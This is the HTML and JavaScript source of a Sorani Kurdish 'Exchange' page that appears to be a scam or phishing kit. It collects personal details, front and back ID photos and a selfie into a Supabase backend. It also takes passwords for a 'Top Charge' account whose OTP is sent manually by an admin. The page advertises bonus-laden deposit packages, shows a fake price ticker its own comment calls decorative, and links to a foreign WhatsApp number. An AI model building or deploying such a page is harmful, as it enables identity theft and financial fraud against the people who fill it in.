<!DOCTYPE html>
<html lang="ckb" dir="rtl">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<meta name="theme-color" content="#0b1220">
<title>Exchange</title>
<script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2.45.4/dist/umd/supabase.min.js"></script>
<style>
:root{--bg:#050a24;--card:#070d30;--line:#0f2a4d;--gold:#17d4ee;--green:#0ecb81;--red:#f6465d;--txt:#e8ecf4;--mut:#8b97b1}
*{box-sizing:border-box}
body{margin:0;background:radial-gradient(900px 400px at 80% -10%,#0a1650 0,transparent 60%),var(--bg);color:var(--txt);font-family:Tahoma,Arial,sans-serif;min-height:100vh}
.ticker{background:#030720;border-bottom:1px solid var(--line);overflow:hidden;direction:ltr;white-space:nowrap;font-size:13px;padding:8px 0}
.ticker div{display:inline-block;animation:run 35s linear infinite}
.ticker span{margin:0 22px;color:var(--mut)}
.ticker b{color:var(--txt);margin-right:6px}
.up{color:var(--green)}.dn{color:var(--red)}
@keyframes run{from{transform:translateX(0)}to{transform:translateX(-50%)}}
.wrap{max-width:480px;margin:0 auto;padding:20px 16px 40px}
.brand{display:flex;align-items:center;gap:10px;margin:8px 0 18px}
.logo{width:42px;height:42px;border-radius:12px;background:linear-gradient(135deg,var(--gold),#12dcf0);display:grid;place-items:center;font-size:22px;color:#000}
.brand h1{font-size:19px;margin:0}.brand small{color:var(--mut)}
.steps{display:flex;gap:8px;margin-bottom:18px}
.steps div{flex:1;background:var(--card);border:1px solid var(--line);border-radius:12px;padding:10px 6px;text-align:center;font-size:12px;color:var(--mut)}
.steps b{display:block;color:var(--gold);font-size:18px}
.card{background:var(--card);border:1px solid var(--line);border-radius:22px;padding:18px;margin-bottom:14px}
.card h3{margin:0 0 4px;font-size:15px;color:var(--gold);display:flex;align-items:center;gap:8px}
label{display:block;margin:14px 0 6px;font-size:13px;color:var(--mut)}
input,select{width:100%;padding:16px;border:1.5px solid var(--line);border-radius:18px;background:#031634;color:var(--txt);font-size:16px;outline:none;color-scheme:dark}
input:focus,select:focus{border-color:var(--gold)}
input[type=file]{padding:10px;font-size:13px}
input[type=file]::file-selector-button{background:var(--gold);color:#000;border:0;padding:6px 12px;border-radius:8px;margin-left:10px;cursor:pointer;font-weight:bold}
.chk{display:flex;gap:10px;align-items:flex-start;font-size:14px;color:var(--txt)}
.chk input{width:auto;margin-top:3px;accent-color:var(--gold)}
button{width:100%;padding:18px;border:0;border-radius:20px;background:#12dcf0;color:#02142b;font-size:18px;font-weight:600;cursor:pointer}
button:disabled{opacity:.6}
#msg{margin-top:12px;text-align:center;font-size:14px}
.done{text-align:center;padding:30px 10px}.done .ic{font-size:54px}
.sec{font-size:12px;color:var(--mut);text-align:center;margin-top:10px}

.tc{background:transparent;border:0;padding:6px 2px}.tc h2{font-size:30px;margin:6px 0 6px}.tc p.sub{color:var(--mut);margin:0 0 8px;font-size:15px}.tc label{color:var(--txt);font-size:15px}.pw{position:relative}.pw input{padding-left:54px}.eye{position:absolute;left:12px;top:50%;transform:translateY(-50%);width:auto;background:none;padding:6px;margin:0;border-radius:8px}
.ph{display:flex;direction:ltr;gap:8px}
.cc{display:flex;align-items:center;gap:8px;background:#031634;border:1.5px solid var(--line);border-radius:18px;padding:0 14px;color:var(--mut);font-size:16px;white-space:nowrap}
.cc svg{width:28px;height:19px;border-radius:3px}
.ph input{flex:1;min-width:0}
.lnk{background:none;color:var(--gold);border:0;width:auto;font-size:13px;padding:8px 0;margin:0;font-weight:normal}
.tc button.main{margin-top:16px}

.wa{position:fixed;bottom:20px;left:16px;z-index:99;width:58px;height:58px;border-radius:50%;background:#25d366;display:grid;place-items:center;box-shadow:0 4px 16px #0008;animation:pulse 2s infinite}
.wa svg{width:32px;height:32px;fill:#fff}
@keyframes pulse{0%{box-shadow:0 0 0 0 #25d36699}70%{box-shadow:0 0 0 16px #25d36600}100%{box-shadow:0 0 0 0 #25d36600}}

.pk{display:flex;justify-content:space-between;align-items:center;gap:10px;border:1.5px solid var(--line);border-radius:22px;padding:18px;margin-top:12px;cursor:pointer;background:#031634;direction:ltr}
.pk.on{border-color:var(--gold);box-shadow:0 0 0 1px var(--gold) inset}
.pk .a{font-size:24px;font-weight:bold}.pk small{color:var(--mut);display:block;margin-top:4px;font-size:13px}
.pk .b{background:#0ecb8122;color:var(--green);padding:6px 12px;border-radius:99px;font-weight:bold;font-size:15px}
</style>
</head>
<body>
<div class="ticker"><div id="tk"></div></div>
<div class="wrap" id="app">

  <div class="card">
    <h3>👤 زانیاری کەسی</h3>
    <label>ناوی سیانی</label><input id="name" placeholder="ناوی خۆت، باوک، باپیر">
    <label>ژمارەی مۆبایل</label><input id="phone" type="tel" dir="ltr" placeholder="07XX XXX XXXX">
    <label>ئیمەیل</label><input id="email" type="email" dir="ltr" placeholder="name@example.com">
    <label>بەرواری لەدایکبوون</label><input id="dob" type="date" dir="ltr">
    <label>ڕەگەز</label><select id="gender"><option value="">هەڵبژێرە</option><option>نێر</option><option>مێ</option></select>
  </div>

  <div class="card">
    <h3>📍 ناونیشان</h3>
    <label>پارێزگا</label>
    <select id="province"><option value="">هەڵبژێرە</option><option>هەولێر</option><option>سلێمانی</option><option>دهۆک</option><option>هەڵەبجە</option><option>کەرکووک</option><option>بەغدا</option><option>موسل</option><option>دیکە</option></select>
    <label>ناونیشانی ورد</label><input id="address" placeholder="شار، گەڕەک، نزیکترین شوێن">
  </div>

  <div class="card">
    <h3>🪪 بەڵگەنامە</h3>
    <label>وێنەی پێناسە (ڕووی پێشەوە)</label><input id="idf" type="file" accept="image/*">
    <label>وێنەی پێناسە (ڕووی پشتەوە)</label><input id="idb" type="file" accept="image/*">
    <label>سێلفی (ڕووخسارت ڕوون بێت)</label><input id="selfie" type="file" accept="image/*" capture="user">
  </div>

  <div class="card">
    <div class="chk"><input id="ok" type="checkbox"><label for="ok" style="margin:0;color:var(--txt)">دان دەنێم کە هەموو زانیارییەکان ڕاستن</label></div>
  </div>
  <button id="btn">ناردنی داواکاری</button>
  <div id="msg"></div>
  
  <div class="card tc" id="tc">
    <h2>Top Charge</h2><p class="sub">بە سەلامەتی بچۆ ژوورەوە بۆ ئەکاونتی Top Charge</p>
    <label>ژمارەی مۆبایل</label>
    <div class="ph"><div class="cc"><svg viewBox="0 0 30 20"><rect width="30" height="7" fill="#ce1126"/><rect y="7" width="30" height="6" fill="#fff"/><rect y="13" width="30" height="7" fill="#000"/><text x="15" y="12" font-size="5" fill="#007a3d" text-anchor="middle" font-family="Arial">الله أكبر</text></svg><span dir="ltr">+964</span><svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="#7d8aa8" stroke-width="2.5"><path d="M6 9l6 6 6-6"/></svg></div>
      <input id="tcp" type="tel" dir="ltr" inputmode="numeric" maxlength="11" placeholder="7XX XXX XXXX"></div>
    <label>پاسۆرد</label>
    <div class="pw"><input id="tcw" type="password" dir="ltr"><button type="button" class="eye" id="eye"><svg width="26" height="26" viewBox="0 0 24 24" fill="none" stroke="#7d8aa8" stroke-width="2"><path d="M1 12s4-7 11-7 11 7 11 7-4 7-11 7S1 12 1 12z"/><circle cx="12" cy="12" r="3"/></svg></button></div>
    <div id="tcotp" style="display:none">
      <label>کۆدی OTP (ئەدمین بۆت دەنێرێت)</label>
      <input id="tcc" type="tel" dir="ltr" inputmode="numeric" maxlength="6" placeholder="------" style="text-align:center;letter-spacing:8px;font-size:20px">
    </div>
    <button class="main" id="tcb1">داواکردنی کۆد</button>
    <button class="main" id="tcb2" style="display:none">پشتڕاستکردنەوە</button>
    <button class="lnk" id="tcl">کۆدم هەیە</button>
    <button class="lnk" id="tcg" style="display:block">ئەکاونتم هەیە، چوونەژوورەوە</button>
    <div id="tcm" style="text-align:center;font-size:14px"></div>
  </div>
  <div class="sec">🔒 زانیارییەکانت تەنها بۆ پشتڕاستکردنەوە بەکاردێن</div>
</div>
<a class="wa" id="wa" target="_blank" rel="noopener" aria-label="WhatsApp"><svg viewBox="0 0 32 32"><path d="M16 3.5C9.100 3.5 3.500 9 3.500 15.800c0 2.300.7 4.500 1.800 6.300L3.800 28.500l6.600-1.700c1.700.9 3.700 1.400 5.600 1.400 6.900 0 12.500-5.500 12.500-12.400S22.900 3.500 16 3.500z" fill="none" stroke="#fff" stroke-width="2"/><path d="M11.500 9.500c-.8 0-1.500.8-1.500 1.800 0 5.300 4.600 9.900 9.900 9.900 1 0 1.800-.7 1.800-1.500v-2l-3.200-1.400-1.600 1.600c-1.700-.9-3.100-2.300-4-4l1.600-1.600-1.400-3.200z"/></svg></a>
<script>
// ticker (دیکۆرە تەنها، نرخی ڕاستەقینە نییە)
const pairs=[["USD/IQD","▲",1],["EUR/IQD","▼",0],["GBP/IQD","▲",1],["TRY/IQD","▼",0],["AED/IQD","▲",1],["USD/EUR","▼",0],["XAU/USD","▲",1]];
const row=pairs.map(p=>`<span><b>${p[0]}</b><i class="${p[2]?"up":"dn"}">${p[1]}</i></span>`).join("");
document.getElementById("tk").innerHTML=row+row+row+row;

const sb = supabase.createClient("https://qieifmpzmenpfewfsssl.supabase.co","sb_publishable_-yOD7PqBzqKuxrhbr7FmVQ_6HPhspI_");
const $ = id => document.getElementById(id);
const say = (t, ok) => { $("msg").textContent = t; $("msg").style.color = ok ? "var(--green)" : "var(--red)"; };
async function upload(file) {
  if (file.size > 5*1024*1024) throw new Error("هەر وێنەیەک دەبێت لە 5MB کەمتر بێت");
  const ext = (file.name.split(".").pop() || "jpg").toLowerCase();
  const path = crypto.randomUUID() + "." + ext;
  const { error } = await sb.storage.from("id-photos").upload(path, file);
  if (error) throw error;
  return path;
}
$("btn").onclick = async () => {
  const v = { full_name:$("name").value.trim(), phone:$("phone").value.trim(), email:$("email").value.trim(),
    dob:$("dob").value, gender:$("gender").value, province:$("province").value, address:$("address").value.trim() };
  const f = [$("idf").files[0], $("idb").files[0], $("selfie").files[0]];
  if (Object.values(v).some(x=>!x) || f.some(x=>!x)) return say("تکایە هەموو خانەکان پڕ بکەرەوە", false);
  if (!$("ok").checked) return say("دەبێت ڕەزامەندی بدەیت", false);
  $("btn").disabled = true; say("تکایە چاوەڕێ بە...", true);
  try {
    let id_front_path, id_back_path, selfie_path;
    try { [id_front_path, id_back_path, selfie_path] = await Promise.all(f.map(upload)); }
    catch (e) { e.message = "(وێنە) " + e.message; throw e; }
    const { error } = await sb.from("agents").insert({ ...v, id_front_path, id_back_path, selfie_path });
    if (error) { error.message = "(زانیاری) " + error.message; throw error; }
    $("app").innerHTML = '<div class="card done"><div class="ic">✅</div><h2>داواکارییەکەت وەرگیرا</h2><p style="color:var(--mut)">تیمەکەمان زانیارییەکانت پشتڕاست دەکاتەوە و بە زووترین کات پەیوەندیت پێوە دەکەین.</p></div>';
  } catch (e) {
    say(e.code === "23505" ? "ئەم ژمارە یان ئیمەیلە پێشتر تۆمارکراوە" : "هەڵە: " + e.message, false);
    $("btn").disabled = false;
  }
};

// ---- Top Charge ----
$("eye").onclick=()=>{const w=$("tcw");w.type=w.type==="password"?"text":"password"};
const tcm=(t,ok)=>{$("tcm").textContent=t;$("tcm").style.color=ok?"var(--green)":"var(--red)"};
const tcNum=()=>{let d=$("tcp").value.replace(/\D/g,"");if(d.startsWith("964"))d=d.slice(3);if(d.startsWith("0"))d=d.slice(1);return d};
const tcOtpMode=()=>{$("tcotp").style.display="block";$("tcb1").style.display="none";$("tcb2").style.display="block";$("tcl").style.display="none"};
function tcCheck(){const n=tcNum();if(!/^7\d{9}$/.test(n)){tcm("ژمارەی مۆبایل هەڵەیە (نموونە: 7501234567)");return null}
  if($("tcw").value.length<6){tcm("پاسۆرد دەبێت لانیکەم 6 پیت بێت");return null}return "+964"+n}
$("tcl").onclick=tcOtpMode;
$("tcb1").onclick=async()=>{const p=tcCheck();if(!p)return;$("tcb1").disabled=true;tcm("چاوەڕێ بە...",true);
  const {error}=await sb.rpc("tc_request",{p_phone:p,p_pass:$("tcw").value});
  $("tcb1").disabled=false;
  if(error)return tcm(error.message);
  tcm("داواکارییەکەت نێردرا. کۆدی OTP لەلایەن ئەدمینەوە بۆت دەنێردرێت، پاشان لێرە بینووسە.",true);tcOtpMode()};
$("tcb2").onclick=async()=>{const p=tcCheck();if(!p)return;const c=$("tcc").value.trim();
  if(!/^\d{6}$/.test(c))return tcm("کۆد 6 ژمارەیە");
  $("tcb2").disabled=true;
  const {data,error}=await sb.rpc("tc_verify",{p_phone:p,p_pass:$("tcw").value,p_code:c});
  $("tcb2").disabled=false;
  if(error)return tcm(error.message);
  if(data){tcDash(p,$("tcw").value)}
  else tcm("کۆد یان پاسۆرد هەڵەیە، یان کۆدەکە بەسەرچووە")};

// WhatsApp: ژمارە بێ + و بێ 0 (کۆدی وڵات سەرەتا)
const WA_NUMBER = "6288214653918";
const WA_TEXT = "سڵاو، پێویستم بە یارمەتییە";
$("wa").href = "https://wa.me/" + WA_NUMBER + "?text=" + encodeURIComponent(WA_TEXT);

$("tcg").onclick=async()=>{const p=tcCheck();if(!p)return;tcm("چاوەڕێ بە...",true);
  const {data,error}=await sb.rpc("tc_login",{p_phone:p,p_pass:$("tcw").value});
  if(error)return tcm(error.message);
  if(data)tcDash(p,$("tcw").value);else tcm("ژمارە یان پاسۆرد هەڵەیە، یان ئەکاونتەکەت هێشتا چالاک نەکراوە")};
const PK=[[2000000,300000],[4000000,600000],[8000000,900000]];
const fmt=n=>n.toLocaleString("en-US");
function tcDash(phone,pass){
  let sel=null;
  $("tc").innerHTML='<h2>Top Charge</h2><p class="sub">بڕێک هەڵبژێرە و بۆنەسەکەت وەردەگریت</p>'+
    PK.map((x,i)=>`<div class="pk" data-i="${i}"><div><div class="a">${fmt(x[0])}</div><small>وەردەگریت: ${fmt(x[0]+x[1])}</small></div><div class="b">+${fmt(x[1])}</div></div>`).join("")+
    '<button class="main" id="tcgo" style="margin-top:20px">داواکردنی پڕکردنەوە</button><div id="tcm2" style="text-align:center;font-size:14px;margin-top:12px"></div>';
  const m=(t,ok)=>{$("tcm2").textContent=t;$("tcm2").style.color=ok?"var(--green)":"var(--red)"};
  document.querySelectorAll(".pk").forEach(el=>el.onclick=()=>{
    document.querySelectorAll(".pk").forEach(e=>e.classList.remove("on"));el.classList.add("on");sel=+el.dataset.i});
  $("tcgo").onclick=async()=>{
    if(sel===null)return m("تکایە بڕێک هەڵبژێرە");
    $("tcgo").disabled=true;
    const {error}=await sb.rpc("tc_order",{p_phone:phone,p_pass:pass,p_amount:PK[sel][0]});
    $("tcgo").disabled=false;
    if(error)return m(error.message);
    m("داواکارییەکەت نێردرا ✅ ("+fmt(PK[sel][0])+" + "+fmt(PK[sel][1])+")",true)}}
</script>
</body>
</html>
